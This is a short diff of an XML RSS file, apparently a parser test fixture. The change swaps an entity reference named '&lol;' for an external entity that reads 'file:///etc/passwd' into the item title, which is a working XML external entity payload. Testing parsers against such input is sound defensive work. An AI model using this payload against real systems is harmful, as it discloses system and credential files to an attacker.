@@ -1,15 +1,11 @@
-<?xml version="1.0"?>
-<!DOCTYPE rss [
-    <!ELEMENT rss (channel,item,title)>
-    <!ELEMENT channel (#PCDATA)>
-    <!ELEMENT item (#PCDATA)>
-    <!ELEMENT title (#PCDATA)>
-]>
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE title [ <!ELEMENT title ANY >
+<!ENTITY data SYSTEM "file:///etc/passwd" >]>
 
-<rss>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
         <item>
-          <title>&lol;</title>
+          <title>&data;</title>
         </item>
   </channel>
 </rss>
